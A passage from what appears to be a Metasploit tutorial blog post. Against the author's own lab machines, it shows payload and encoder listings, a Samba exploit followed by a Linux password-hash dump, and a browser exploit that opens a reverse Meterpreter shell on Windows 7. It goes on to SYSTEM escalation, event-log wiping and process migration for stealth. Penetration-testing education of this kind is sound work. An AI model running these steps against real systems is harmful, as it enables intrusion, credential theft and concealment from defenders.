
<p>Module options (exploit/windows/smb/ms08_067_netapi):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   RHOST    192.168.80.156   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Targeting
```</p>

<p>A couple of payloads:</p>

<p>``` plain
msf exploit(ms08_067_netapi) > show payloads</p>

<h1>Compatible Payloads</h1>

<p>   Name                                                Disclosure Date  Rank    Description</p>

<hr />

<p>   generic/custom                                                       normal  Custom Payload
   generic/debug_trap                                                   normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                                   normal  Generic x86 Tight Loop
   windows/adduser                                                      normal  Windows Execute net user /ADD
&hellip;
```</p>

<h3>Evasion</h3>

<p>For the evasion options available for each module, you can use the command <strong>show evasion</strong>:</p>

<p>``` plain
msf exploit(advantech_switch_bash_env_exec) > show evasion</p>

<p>Module evasion options:</p>

<p>   Name           : <a href="HTTP::header_folding">HTTP::header_folding</a>
   Current Setting: false
   Description    : Enable folding of HTTP headers</p>

<p>   Name           : <a href="HTTP::method_random_case">HTTP::method_random_case</a>
   Current Setting: false
   Description    : Use random casing for the HTTP method</p>

<p>   Name           : <a href="HTTP::method_random_invalid">HTTP::method_random_invalid</a>
   Current Setting: false
   Description    : Use a random invalid, HTTP method for request
&hellip;
```</p>

<h3>Encoders</h3>

<p>Metasploit automatically selects the best encoder for the job given the selected criteria. If you want to use a specific encoder, you can select one from the multitude available:</p>

<p>``` plain
msf payload(generic) > show encoders</p>

<h1>Encoders</h1>

<p>   Name                          Disclosure Date  Rank       Description</p>

<hr />

<p>   cmd/echo                                       good       Echo Command Encoder
   cmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                        low        Generic ${IFS} Substitution Command Encoder
   cmd/perl                                       normal     Perl Command Encoder
   cmd/powershell_base64                          excellent  Powershell Base64 Command Encoder
   cmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder
   generic/eicar                                  manual     The EICAR Encoder
   generic/none                                   normal     The &ldquo;none&rdquo; Encoder
   mipsbe/byte_xori                               normal     Byte XORi Encoder
   mipsbe/longxor                                 normal     XOR Encoder
   mipsle/byte_xori                               normal     Byte XORi Encoder
   mipsle/longxor                                 normal     XOR Encoder
   php/base64                                     great      PHP Base64 Encoder
   ppc/longxor                                    normal     PPC LongXOR Encoder
   ppc/longxor_tag                                normal     PPC LongXOR Encoder
   sparc/longxor_tag                              normal     SPARC DWORD XOR Encoder
   x64/xor                                        normal     XOR Encoder
   x86/add_sub                                    manual     Add/Sub Encoder
   x86/alpha_mixed                                low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                                low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_underscore_tolower                   manual     Avoid underscore/tolower
   x86/avoid_utf8_tolower                         manual     Avoid UTF8/tolower
   x86/bloxor                                     manual     BloXor &ndash; A Metamorphic Block Based XOR Encoder
   x86/call4_dword_xor                            normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                              manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                               manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                               manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                                  normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                                normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                          normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                                   low        Non-Alpha Encoder
   x86/nonupper                                   low        Non-Upper Encoder
   x86/opt_sub                                    manual     Sub Encoder (optimised)
   x86/shikata_ga_nai                             excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                          manual     Single Static Bit
   x86/unicode_mixed                              manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                              manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```</p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<p>``` plain
msf > help spool
Usage: spool <off>|<filename></p>

<p>Example:
  spool /tmp/console.log
```</p>

<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<p>``` plain
sf payload(generic) > generate -h
Usage: generate [options]</p>

<p>Generates a payload.</p>

<p>OPTIONS:</p>

<pre><code>-E        Force encoding.
-b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
-e &lt;opt&gt;  The name of the encoder module to use.
-f &lt;opt&gt;  The output file name (otherwise stdout)
-h        Help banner.
-i &lt;opt&gt;  the number of encoding iterations.
-k        Keep the template executable functional
-o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
-p &lt;opt&gt;  The Platform for output.
-s &lt;opt&gt;  NOP sled length.
-t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
-x &lt;opt&gt;  The executable template to use
</code></pre>

<p>```</p>

<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<p>``` plain</p>

<h1>Database Backend Commands</h1>

<pre><code>Command           Description
-------           -----------
creds             List all credentials in the database
db_connect        Connect to an existing database
db_disconnect     Disconnect from the current database instance
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache
db_status         Show the current database status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
</code></pre>

<p>```</p>

<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<p>``` plain
msf > help workspace
Usage:</p>

<pre><code>workspace                  List workspaces
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
workspace -h               Show this help information
</code></pre>

<p>```</p>

<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<p><code>plain
msf &gt; workspace -a lab
[*] Added workspace: lab
msf &gt; workspace
  default
* lab
</code></p>

<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<p>``` plain
msf > hosts</p>

<h1>Hosts</h1>

<p>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments</p>

<hr />

<p>192.168.80.156  00:0c:29:e5:3a:67        Linux               2.6.X  server       <br/>
```</p>

<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<p>``` plain
msf > hosts -h
Usage: hosts [ options ] [addr1 addr2 &hellip;]</p>

<p>OPTIONS:
  -a,&mdash;add          Add the hosts instead of searching
  -d,&mdash;delete       Delete the hosts instead of searching
  -c &lt;col1,col2>    Only show the given columns (see list below)
  -h,&mdash;help         Show this help information
  -u,&mdash;up           Only show hosts which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by
  -i,&mdash;info         Change the info of a host
  -n,&mdash;name         Change the name of a host
  -m,&mdash;comment      Change the comment of a host
  -t,&mdash;tag          Add or specify a tag to a range of hosts</p>

<p>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```</p>

<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<p>``` plain
msf > services -h</p>

<p>Usage: services [-h] [-u] [-a] [-r <proto>] [-p &lt;port1,port2>] [-s &lt;name1,name2>] [-o <filename>] [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add the services instead of searching
  -d,&mdash;delete       Delete the services instead of searching
  -c &lt;col1,col2>    Only show the given columns
  -h,&mdash;help         Show this help information
  -s &lt;name1,name2>  Search for a list of service names
  -p &lt;port1,port2>  Search for a list of ports
  -r <protocol>     Only show [tcp|udp] services
  -u,&mdash;up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by</p>

<p>Available columns: created_at, info, name, port, proto, state, updated_at</p>

<p>msf > services</p>

<h1>Services</h1>

<p>host            port  proto  name         state  info</p>

<hr />

<p>192.168.80.156  21    tcp    ftp          open   ProFTPD 1.3.1
192.168.80.156  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
192.168.80.156  23    tcp    telnet       open   Linux telnetd
192.168.80.156  25    tcp    smtp         open   Postfix smtpd
192.168.80.156  53    tcp    domain       open   ISC BIND 9.4.2
192.168.80.156  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
192.168.80.156  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
192.168.80.156  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
192.168.80.156  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
192.168.80.156  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 &ndash; 8.3.7
192.168.80.156  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
192.168.80.156  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
```</p>

<p>You can also look at the vulnerabilities associated with different services:</p>

<p>``` plain
msf > help vulns
Print all vulnerabilities in the database</p>

<p>Usage: vulns [addr range]</p>

<p>  -h,&mdash;help             Show this help information
  -p,&mdash;port <portspec>  List vulns matching this port spec
  -s <svc names>        List vulns matching these service names
  -R,&mdash;rhosts           Set RHOSTS from the results of the search
  -S,&mdash;search           Search string to filter by
  -i,&mdash;info             Display Vuln Info</p>

<p>Examples:
  vulns -p 1-65536          # only vulns with associated services
  vulns -p 1-65536 -s http  # identified as http on any port
```</p>

<p>It&rsquo;s possible to also add notes:</p>

<p>``` plain
msf > help notes
Usage: notes [-h] [-t &lt;type1,type2>] [-n <data string>] [-a] [addr range]</p>

<p>  -a,&mdash;add                  Add a note to the list of addresses, instead of listing
  -d,&mdash;delete               Delete the hosts instead of searching
  -n,&mdash;note <data>          Set the data for a new note (only with -a)
  -t &lt;type1,type2>          Search for a list of types
  -h,&mdash;help                 Show this help information
  -R,&mdash;rhosts               Set RHOSTS from the results of the search
  -S,&mdash;search               Regular expression to match for search
  -o,&mdash;output               Save the notes to a csv file
  &mdash;sort &lt;field1,field2>    Fields to sort by (case sensitive)</p>

<p>Examples:
  notes &mdash;add -t apps -n &lsquo;winzip&rsquo; 10.1.1.34 10.1.20.41
  notes -t smb.fingerprint 10.1.1.34 10.1.20.41
  notes -S &lsquo;nmap.nse.(http|rtsp)&rsquo; &mdash;sort type,output
```</p>

<p>If credentials were found, we have a way to list and manage them:</p>

<p>``` plain
msf > help creds</p>

<p>With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.</p>

<p>Usage &ndash; Listing credentials:
  creds [filter options] [address range]</p>

<p>Usage &ndash; Adding credentials:
  creds add-ntlm <user> <ntlm hash> [domain]
  creds add-password <user> <password> [realm] [realm-type]
  creds add-ssh-key <user> &lt;/path/to/id_rsa> [realm-type]
Where [realm type] can be one of:
  domain &ndash; Active Directory Domain
  db2db &ndash; DB2 Database
  sid &ndash; Oracle System Identifier
  pgdb &ndash; PostgreSQL Database
  wildcard &ndash; *</p>

<p>General options
  -h,&mdash;help             Show this help information
  -o <file>             Send output to a file in csv format
  -d                    Delete one or more credentials</p>

<p>Filter options for listing
  -P,&mdash;password <regex> List passwords that match this regex
  -p,&mdash;port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,&mdash;user <regex>     List users that match this regex
  -t,&mdash;type <type>      List creds that match the following types: password,ntlm,hash
  -O,&mdash;origins          List creds that match these origins
  -R,&mdash;rhosts           Set RHOSTS from the results of the search</p>

<p>Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # nmap host specification
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t ntlm       # All NTLM creds</p>

<p>Examples, adding:
  # Add a user with an NTLMHash
  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
  # Add a user with a blank password and a domain
  creds add-password bob &lsquo;&rsquo; contosso
  # Add a user with an SSH key
  creds add-ssh-key root /root/.ssh/id_rsa</p>

<p>Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```</p>

<p>As you can see though, I have no credentials in the database:</p>

<p>``` plain
msf > creds</p>

<h1>Credentials</h1>

<p>host  origin  service  public  private  realm  private_type</p>

<hr />

<p>```</p>

<p>Finally, there is the loot:</p>

<p>``` plain
msf > help loot
Usage: loot <options>
 Info: loot [-h] [addr1 addr2 &hellip;] [-t &lt;type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 &hellip;] [-t [type]
  Del: loot -d [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add loot to the list of addresses, instead of listing
  -d,&mdash;delete       Delete <em>all</em> loot matching host and type
  -f,&mdash;file         File with contents of the loot to add
  -i,&mdash;info         Info of the loot to add
  -t &lt;type1,type2>  Search for a list of types
  -h,&mdash;help         Show this help information
  -S,&mdash;search       Search string to filter by
```</p>

<p>I have compromised the target via the Samba service and now I will loot some hashes from it:</p>

<p>``` plain
msf exploit(usermap_script) > run -j
[*] Exploit running as background job.</p>

<p>[<em>] Started bind handler
msf exploit(usermap_script) > [</em>] Command shell session 2 opened (192.168.80.155:49009 &ndash;> 192.168.80.156:4444) at 2016-06-03 13:19:48 -0400</p>

<p>msf exploit(usermap_script) > use post/linux/gather/hashdump
msf post(hashdump) > options</p>

<p>Module options (post/linux/gather/hashdump):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   SESSION                   yes       The session to run this module on.</p>

<p>msf post(hashdump) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type        Information  Connection</p>

<hr />

<p>  2   shell unix               192.168.80.155:49009 &ndash;> 192.168.80.156:4444 (192.168.80.156)</p>

<p>msf post(hashdump) > set SESSION 2
SESSION => 2
msf post(hashdump) > run</p>

<p>[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
[*] Post module execution completed
```</p>

<p>Now I can see the loot in the database:</p>

<p>``` plain
msf post(hashdump) > loot</p>

<h1>Loot</h1>

<p>host            service  type          name                   content     info                            path</p>

<hr />

<p>192.168.80.156           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
192.168.80.156           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.passwd_153460.txt
192.168.80.156           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.shadow_842643.txt
```</p>

<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > options</p>

<p>Module options (exploit/windows/browser/ms11_003_ie_css_import):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   OBFUSCATE  true             no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)</p>

<p>Payload options (windows/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic
```</p>

<p>And the description of what this exploit does:</p>

<p><code>plain
Description:
  This module exploits a memory corruption vulnerability within
  Microsoft\'s HTML engine (mshtml). When parsing an HTML page
  containing a recursive CSS import, a C++ object is deleted and later
  reused. This leads to arbitrary code execution. This exploit
  utilizes a combination of heap spraying and the .NET 2.0
  'mscorie.dll' module to bypass DEP and ASLR. This module does not
  opt-in to ASLR. As such, this module should be reliable on all
  Windows versions with .NET 2.0.50727 installed.
</code></p>

<p>All right, first I start the handler on my attacking machine:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > run -j
[*] Exploit running as background job.</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444
[</em>] Using URL: <a href="http://0.0.0.0:8080/Br8CNFRY">http://0.0.0.0:8080/Br8CNFRY</a>
msf exploit(ms11_003_ie_css_import) > [<em>] Local IP: <a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a>
[</em>] Server started.
```</p>

<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<p><code>plain
msf exploit(ms11_003_ie_css_import) &gt; [*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending redirect
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/RHHy0H.html"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending HTML
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/generic-1465040907.dll"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending .NET DLL
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending CSS
[*] Sending stage (957487 bytes) to 192.168.80.128
[*] Meterpreter session 5 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49281) at 2016-06-04 07:48:33 -0400
[*] Session ID 5 (192.168.80.155:4444 -&gt; 192.168.80.128:49281) processing InitialAutoRunScript 'migrate -f'
[*] Current server process: iexplore.exe (2772)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 988
[+] Successfully migrated to process
</code></p>

<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type                   Information                                Connection</p>

<hr />

<p>  5   meterpreter x86/win32  WIN-D7GA2J1M0TU\wingoat @ WIN-D7GA2J1M0TU  192.168.80.155:4444 &ndash;> 192.168.80.128:49281 (192.168.80.128)</p>

<p>msf exploit(ms11_003_ie_css_import) > sessions -i 5
[*] Starting interaction with 5&hellip;
```</p>

<p>The reason I wanted to show Meterpreter on a Windows target is because there are many commands unique to Windows that we can use. I will demo them further</p>

<h2>Meterpreter commands</h2>

<p>``` plain
meterpreter > ?</p>

<h1>Core Commands</h1>

<pre><code>Command                   Description
-------                   -----------
?                         Help menu
background                Backgrounds the current session
bgkill                    Kills a background meterpreter script
bglist                    Lists running background scripts
bgrun                     Executes a meterpreter script as a background thread
channel                   Displays information or control active channels
close                     Closes a channel
disable_unicode_encoding  Disables encoding of unicode strings
enable_unicode_encoding   Enables encoding of unicode strings
exit                      Terminate the meterpreter session
get_timeouts              Get the current session timeout values
help                      Help menu
info                      Displays information about a Post module
irb                       Drop into irb scripting mode
load                      Load one or more meterpreter extensions
machine_id                Get the MSF ID of the machine attached to the session
migrate                   Migrate the server to another process
quit                      Terminate the meterpreter session
read                      Reads data from a channel
resource                  Run the commands stored in a file
run                       Executes a meterpreter script or Post module
set_timeouts              Set the current session timeout values
sleep                     Force Meterpreter to go quiet, then re-establish session.
transport                 Change the current transport mechanism
use                       Deprecated alias for 'load'
uuid                      Get the UUID for the current session
write                     Writes data to a channel
</code></pre>

<h1>Stdapi: File system Commands</h1>

<pre><code>Command       Description
-------       -----------
cat           Read the contents of a file to the screen
cd            Change directory
download      Download a file or directory
edit          Edit a file
getlwd        Print local working directory
getwd         Print working directory
lcd           Change local working directory
lpwd          Print local working directory
ls            List files
mkdir         Make directory
mv            Move source to destination
pwd           Print working directory
rm            Delete the specified file
rmdir         Remove directory
search        Search for files
show_mount    List all mount points/logical drives
upload        Upload a file or directory
</code></pre>

<h1>Stdapi: Networking Commands</h1>

<pre><code>Command       Description
-------       -----------
arp           Display the host ARP cache
getproxy      Display the current proxy configuration
ifconfig      Display interfaces
ipconfig      Display interfaces
netstat       Display the network connections
portfwd       Forward a local port to a remote service
route         View and modify the routing table
</code></pre>

<h1>Stdapi: System Commands</h1>

<pre><code>Command       Description
-------       -----------
clearev       Clear the event log
drop_token    Relinquishes any active impersonation token.
execute       Execute a command
getenv        Get one or more environment variable values
getpid        Get the current process identifier
getprivs      Attempt to enable all privileges available to the current process
getsid        Get the SID of the user that the server is running as
getuid        Get the user that the server is running as
kill          Terminate a process
ps            List running processes
reboot        Reboots the remote computer
reg           Modify and interact with the remote registry
rev2self      Calls RevertToSelf() on the remote machine
shell         Drop into a system command shell
shutdown      Shuts down the remote computer
steal_token   Attempts to steal an impersonation token from the target process
suspend       Suspends or resumes a list of processes
sysinfo       Gets information about the remote system, such as OS
</code></pre>

<h1>Stdapi: User interface Commands</h1>

<pre><code>Command        Description
-------        -----------
enumdesktops   List all accessible desktops and window stations
getdesktop     Get the current meterpreter desktop
idletime       Returns the number of seconds the remote user has been idle
keyscan_dump   Dump the keystroke buffer
keyscan_start  Start capturing keystrokes
keyscan_stop   Stop capturing keystrokes
screenshot     Grab a screenshot of the interactive desktop
setdesktop     Change the meterpreters current desktop
uictl          Control some of the user interface components
</code></pre>

<h1>Stdapi: Webcam Commands</h1>

<pre><code>Command        Description
-------        -----------
record_mic     Record audio from the default microphone for X seconds
webcam_chat    Start a video chat
webcam_list    List webcams
webcam_snap    Take a snapshot from the specified webcam
webcam_stream  Play a video stream from the specified webcam
</code></pre>

<h1>Priv: Elevate Commands</h1>

<pre><code>Command       Description
-------       -----------
getsystem     Attempt to elevate your privilege to that of local system.
</code></pre>

<h1>Priv: Password database Commands</h1>

<pre><code>Command       Description
-------       -----------
hashdump      Dumps the contents of the SAM database
</code></pre>

<h1>Priv: Timestomp Commands</h1>

<pre><code>Command       Description
-------       -----------
timestomp     Manipulate file MACE attributes
</code></pre>

<p>```</p>

<p>The first thing I will do is migrate to the Windows Explorer process, because a stray Notepad might look suspicious. I got the PID from doing a <em>ps</em>:</p>

<p><code>plain
meterpreter &gt; migrate 1408
[*] Migrating from 988 to 1408...
[*] Migration completed successfully.
meterpreter &gt; getpid
Current pid: 1408
</code></p>

<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

<p>``` plain
meterpreter > background
[<em>] Backgrounding session 5&hellip;
msf exploit(ms11_003_ie_css_import) > echo &lsquo;HA HA HA&rsquo; > read.txt
[</em>] exec: echo &lsquo;HA HA HA&rsquo; > read.txt</p>

<p>meterpreter > upload /root/read.txt C:\
[<em>] uploading  : /root/read.txt &ndash;> C:\
[</em>] uploaded   : /root/read.txt &ndash;> C:\read.txt
meterpreter > cd C:\
meterpreter > cat read.txt
HA HA HA
```</p>

<p>Ok, now I will download something on my machine:</p>

<p><code>plain
meterpreter &gt; download desktop.ini
[*] downloading: desktop.ini -&gt; desktop.ini
[*] download   : desktop.ini -&gt; desktop.ini
meterpreter &gt; cat desktop.ini
��
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
</code></p>

<p>Let&rsquo;s now look at some system information:</p>

<p><code>plain
meterpreter &gt; sysinfo
Computer        : WIN-D7GA2J1M0TU
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/win64
</code></p>

<p>I attempted to get system privileges and it worked:</p>

<p><code>plain
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></p>

<p>It&rsquo;s possible to clear the event log of the machine, though that is anything but stealthy:</p>

<p><code>plain
meterpreter &gt; clearev
[*] Wiping 1583 records from Application...
[*] Wiping 5436 records from System...
[*] Wiping 1422 records from Security...
</code></p>

<p>We can also execute native commands on the target:</p>

<p>``` plain
meterpreter > execute -h
Usage: execute -f file [options]</p>

<p>Executes a command on the remote machine.</p>

<p>OPTIONS:</p>

<pre><code>-H        Create the process hidden from view.
-a &lt;opt&gt;  The arguments to pass to the command.
-c        Channelized I/O (required for interaction).
-d &lt;opt&gt;  The 'dummy' executable to launch when using -m.
-f &lt;opt&gt;  The executable command to run.
-h        Help menu.
-i        Interact with the process after creating it.
-k        Execute process on the meterpreters current desktop
-m        Execute from memory.
-s &lt;opt&gt;  Execute process in a given session as the session user
-t        Execute process with currently impersonated thread token
</code></pre>

<p>meterpreter > execute -f &ldquo;ipconfig /flushdns&rdquo; -i -H
Process 2016 created.
Channel 3 created.</p>

<p>Windows IP Configuration</p>

<p>Successfully flushed the DNS Resolver Cache.
```</p>

<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<p>``` plain
meterpreter > reg -h
Usage: reg [command] [options]</p>

<p>Interact with the target machine&rsquo;s registry.</p>

<p>OPTIONS:</p>

<pre><code>-d &lt;opt&gt;  The data to store in the registry value.
-h        Help menu.
-k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).
-r &lt;opt&gt;  The remote machine name to connect to (with current process credentials
-t &lt;opt&gt;  The registry value type (E.g. REG_SZ).
-v &lt;opt&gt;  The registry value name (E.g. Stuff).
-w        Set KEY_WOW64 flag, valid values [32|64].
</code></pre>

<p>COMMANDS:</p>

<pre><code>enumkey Enumerate the supplied registry key [-k &lt;key&gt;]
createkey   Create the supplied registry key  [-k &lt;key&gt;]
deletekey   Delete the supplied registry key  [-k &lt;key&gt;]
queryclass Queries the class of the supplied key [-k &lt;key&gt;]
setval  Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]
deleteval   Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]
queryval    Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]
</code></pre>

<p>```</p>

<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<p>``` plain
meterpreter > shell
Process 2368 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright &copy; 2009 Microsoft Corporation.  All rights reserved.</p>

<p>C:\Windows\system32>
```</p>

<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<p>``` plain
meterpreter > enumdesktops
Enumerating all accessible desktops</p>

<h1>Desktops</h1>

<pre><code>Session  Station  Name
